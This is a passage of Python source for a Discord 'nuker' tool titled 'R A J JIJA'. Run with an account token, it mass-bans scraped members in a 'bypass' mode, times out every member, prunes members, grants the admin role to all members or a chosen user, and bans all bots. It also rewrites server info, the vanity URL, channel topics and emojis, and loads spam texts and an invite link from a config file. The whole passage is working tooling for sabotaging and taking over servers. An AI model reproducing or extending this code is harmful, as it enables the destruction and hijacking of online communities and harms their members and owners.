                        members = [line.strip() for line in f if line.strip()]
                except FileNotFoundError:
                    await Logger.Error.error("Scraped/members.txt not found. Cannot ban members.")
                    members = []

                async def ban_member_bypass_task(member):
                    async with sem:
                        result = await nuker.ban(session, member)
                    if result:
                        await s.success(f"Banned {member}")
                    else:
                        await e.error(f"Failed to ban {member}")

                ban_tasks = [ban_member_bypass_task(m) for m in members]
                print(Logger.GLOW_BLUE + "Starting member banning (Bypass mode)...")
                await tqdm.gather(*ban_tasks, total=len(ban_tasks), desc="Banning Members (Bypass)", bar_format=tqdm_bar_format_gradient)

                return await back_to_manu()

            elif ch == "03": # Back from Nuke sub-menu
                return await back_to_manu()

        # --- OPTION 19: Timeout all members ---
        elif choice == "19":
            api = Tools.api(f"/guilds/{guild_id}/members")
            users = await Tools.break_limit(session, api, token)

            timeout_duration_seconds = await Funcs.get_input(
                "Enter timeout duration in seconds (e.g., 60 for 1 minute, 3600 for 1 hour, 0 to remove timeout): ",
                lambda x: x.isnumeric() and int(x) >= 0
            )
            timeout_duration_seconds = int(timeout_duration_seconds)

            async def timeout_member_task(member_id, duration):
                async with sem:
                    if await nuker.timeout_member(session, member_id, duration):
                        if duration > 0:
                            await Logger.Success.success(f"Timed out {Fore.YELLOW}{member_id} for {duration} seconds")
                        else:
                            await Logger.Success.success(f"Removed timeout for {Fore.YELLOW}{member_id}")
                    else:
                        await Logger.Error.error(f"Failed to timeout {Fore.RED}{member_id}")

            tasks = [timeout_member_task(member, timeout_duration_seconds) for member in users]
            await tqdm.gather(*tasks, total=len(tasks), desc="Timing out Members", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 20: Prune members ---
        elif choice == "20":
            prune_days = await Funcs.get_input(
                "Enter the number of days of inactivity to prune members (e.g., 7, 30): ",
                lambda x: x.isnumeric() and int(x) >= 1
            )
            prune_days = int(prune_days)

            await Logger.Log.started()
            async with sem: # Use semaphore for this single API call to ensure it's not overwhelmed
                pruned_count = await nuker.prune_members(session, prune_days)

            if pruned_count is not None:
                await Logger.Success.success(f"Successfully pruned {pruned_count} inactive members for {prune_days} days.")
            else:
                await Logger.Error.error(f"Failed to prune members for {prune_days} days.")
            return await back_to_manu()

        # --- OPTION 21: Give admin role to all or a specified user ---
        elif choice == "21":
            target_type = await Funcs.get_input("Give admin to (all/user): ", lambda x: x.lower().strip() in ["all", "user"])
            user_id = None
            if target_type.lower().strip() == "user":
                user_id = await Funcs.get_input("Enter the user ID to give admin: ", lambda x: x.isnumeric())

            await Logger.Log.started()
            async with sem:
                if await nuker.give_admin_role(session, target_user_id=user_id):
                    await Logger.Success.success(f"Successfully gave admin role to {'all members' if not user_id else user_id}.")
                else:
                    await Logger.Error.error(f"Failed to give admin role to {'all members' if not user_id else user_id}.")
            return await back_to_manu()

        # --- OPTION 22: Change Guild Vanity URL ---
        elif choice == "22":
            new_code = await Funcs.get_input("Enter the new vanity URL code: ", lambda x: x != "")
            
            await Logger.Log.started()
            async with sem:
                if await nuker.change_guild_vanity_url(session, new_code):
                    await Logger.Success.success(f"Successfully changed vanity URL to {new_code}.")
                else:
                    await Logger.Error.error(f"Failed to change vanity URL to {new_code}. Make sure your guild has the Vanity URL feature enabled and you have sufficient permissions.")
            return await back_to_manu()

        # --- OPTION 23: Channel Topic Changer ---
        elif choice == "23":
            url = Tools.api(f"/guilds/{guild_id}/channels")
            try:
                channels_data = await fetch(session, 'GET', url, headers=headers) or []
                text_channels = [ch for ch in channels_data if ch['type'] == 0] # Filter for text channels
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch channels: {e}")
                return await back_to_manu()

            topic_target = await Funcs.get_input("Change topic for (all/specific channel ID): ", lambda x: x.lower().strip() in ["all", "specific channel id"])
            
            target_channel_id = None
            if topic_target.lower().strip() == "specific channel id":
                channel_ids = [ch['id'] for ch in text_channels]
                target_channel_id = await Funcs.get_input("Enter the specific channel ID: ", lambda x: x in channel_ids)

            new_topic = await Funcs.get_input("Enter the new channel topic (leave empty to remove): ", lambda x: len(x) <= 1024)
            if not new_topic.strip():
                new_topic = "" # Ensure it's an empty string for removing topic

            async def change_topic_task(channel_id, topic):
                async with sem:
                    if await nuker.change_channel_topic(session, channel_id, topic):
                        await Logger.Success.success(f"Changed topic for {channel_id}")
                    else:
                        await Logger.Error.error(f"Failed to change topic for {channel_id}")

            tasks = []
            if target_channel_id:
                tasks.append(change_topic_task(target_channel_id, new_topic))
            else:
                for channel in text_channels:
                    tasks.append(change_topic_task(channel['id'], new_topic))

            await tqdm.gather(*tasks, total=len(tasks), desc="Changing Channel Topics", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 24: Change Server Info (Name, Icon, Description, Verification Level) ---
        elif choice == "24":
            new_name = await Funcs.get_input("Enter new server name (leave empty to skip): ", lambda x: len(x) <= 100 or x == "")
            new_name = new_name if new_name else None

            icon_option = await Funcs.get_input("Change server icon? (y/n): ", lambda x: x.lower().strip() in ["y", "n"])
            icon_path = None
            if icon_option.lower().strip() == "y":
                Cursor.HideCursor()
                icon_path = await Funcs.get_input(
                    "Drag and drop the new icon or enter its path (use 'd' for default icon in root folder): ",
                    lambda x: (x == 'd') or (os.path.exists(x) and (x.endswith(".jpg") or x.endswith(".png"))),
                )
                icon_path = icon_path if not icon_path == 'd' else "./server_icon.png"
                Cursor.ShowCursor()
            
            new_description = await Funcs.get_input("Enter new server description (leave empty to skip): ", lambda x: len(x) <= 120 or x == "")
            new_description = new_description if new_description else None

            verification_level_str = await Funcs.get_input(
                "Enter new verification level (0: None, 1: Low, 2: Medium, 3: High, 4: Very High, leave empty to skip): ",
                lambda x: x.isnumeric() and int(x) in [0, 1, 2, 3, 4] or x == ""
            )
            new_verification_level = int(verification_level_str) if verification_level_str else None

            await Logger.Log.started()
            async with sem:
                if await nuker.update_guild_info(session, new_name=new_name, icon_path=icon_path, 
                                                 description=new_description, verification_level=new_verification_level):
                    await Logger.Success.success("Successfully updated server information.")
                else:
                    await Logger.Error.error("Failed to update server information.")
            return await back_to_manu()

        # --- OPTION 25: Ban all bots ---
        elif choice == "25":
            await Logger.Log.started()
            await nuker.ban_all_bots(session)
            return await back_to_manu()

        # --- OPTION 26: Server Emoji Rename ---
        elif choice == "26":
            url = Tools.api(f"guilds/{guild_id}/emojis")
            try:
                emojis_data = await fetch(session, 'GET', url, headers=headers) or []
                emojis = {e["id"]: e["name"] for e in emojis_data}
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch emojis: {e}")
                return await back_to_manu()

            if not emojis:
                await Logger.Log.info("No emojis found to rename.")
                return await back_to_manu()

            for emoji_id, emoji_name in emojis.items():
                print(f"ID: {emoji_id}, Name: {emoji_name}")

            target_emoji_id = await Funcs.get_input("Enter the ID of the emoji to rename: ", lambda x: x in emojis.keys())
            new_emoji_name = await Funcs.get_input("Enter the new name for the emoji: ", lambda x: x != "" and len(x) <= 32)

            await Logger.Log.started()
            async with sem:
                if await nuker.rename_emoji(session, target_emoji_id, new_emoji_name):
                    await Logger.Success.success(f"Successfully renamed emoji {target_emoji_id} to {new_emoji_name}.")
                else:
                    await Logger.Error.error(f"Failed to rename emoji {target_emoji_id}.")
            return await back_to_manu()
        
        # --- OPTION 27: Exit ---
        elif choice == "27":
            os._exit(69) # Exit the script

        # --- OPTION 28: Change Server/Guild ---
        elif choice == "28":
            System.Clear() # Clear console for new server selection
            System.Title(" R A J JIJA ×_× - Change Server")
            System.Size(160, 40)

            await Logger.Log.info("Fetching available guilds...")
            guilds = await Tools.get_guilds(token) # Re-fetch guilds to ensure the list is current

            num = 1
            _guilds = {}
            for id, name in guilds:
                print(gb, num, gp, end="- ")
                print(gb, id, gp, name, reset)
                _guilds[str(num)] = id
                num += 1

            print()
            new_guild_choice = await Funcs.get_input("Please Enter the new guild id or its number: ",
                                     lambda x: x.isnumeric() and (x in _guilds or x in [g[0] for g in guilds]))

            new_guild_id = None
            if _guilds.get(str(new_guild_choice)):
                new_guild_id = _guilds[new_guild_choice]
            else:
                new_guild_id = new_guild_choice # Assume it's a direct ID if not a number from list

            if new_guild_id:
                await Logger.Log.info(f"Switching to guild ID: {new_guild_id}")
                # Recursively call main with the new guild ID to restart the menu for the new server
                await main(token, new_guild_id)
            else:
                await Logger.Error.error("Invalid guild selection. Returning to main menu.")
                return await back_to_manu()


# ===================== SCRIPT ENTRY POINT ================================

async def start(args):
    """
    Initializes the script, handles token input (from args or prompt),
    and allows selection of the target guild.
    """
    global token, names, amount, invite_link, guild_name

    # Check for config JSON file passed as argument
    if len(args) > 1:
        if args[1].endswith(".json") and os.path.exists(args[1]):
            with open(args[1], "r", encoding="utf8") as fp:
                j = json.loads(fp.read())
            _in = lambda t: j[t] if t in j else None
            token = _in("Token")
            names = _in("SpamTexts")
            amount = _in("SpamAmount")
            guild_name = _in("ServerName")
            invite_link = _in("SpamInviteLink")

    # Clear console and set title/size
    System.Clear()
    System.Title("R A J JIJA ×_×")
    System.Size(160, 40)

    # Async function to check token validity
    async def token_checker(x):
        return x != "" and not x.isnumeric() and await Tools.check_token(x)

    # Prompt for token if not provided or invalid
    if not token:
        token = await Funcs.get_input("Please Enter your token: ", token_checker)
    else:
        if not await token_checker(token): # Re-check token if provided via config
            token = await Funcs.get_input("Please Enter your token: ", token_checker)

    print() # Newline for spacing

    # Fetch guilds using a separate session for this initial step
    connector = aiohttp.TCPConnector(limit=1) # Small limit as it's just one request
    async with aiohttp.ClientSession(connector=connector) as session_for_guilds:
        guilds = await Tools.get_guilds(token)

    num = 1
    _guilds = {}

    # Define the desired colors for consistency in guild list
    gb = Logger.GLOW_BLUE
    gp = Logger.GLOW_PURPLE
    reset = Logger.RESET

    # Display available guilds
    for id, name in guilds:
        print(gb, num, gp, end="- ")
        print(gb, id, gp, name, reset)
        _guilds[str(num)] = id
        num += 1

    print() # Newline for spacing
    
    # Prompt user to select a guild
    guild = await Funcs.get_input("Please Enter the guild id or its number: ",
                             lambda x: x.isnumeric() and (x in _guilds or x in [g[0] for g in guilds]))

    # Resolve guild ID from number if applicable
    if _guilds.get(str(guild)):
        guild = _guilds[guild]

    # Start the main script loop with the selected token and guild
    await main(token, guild)

# Entry point for script execution
if __name__ == "__main__":
    args = sys.argv
    asyncio.run(start(args))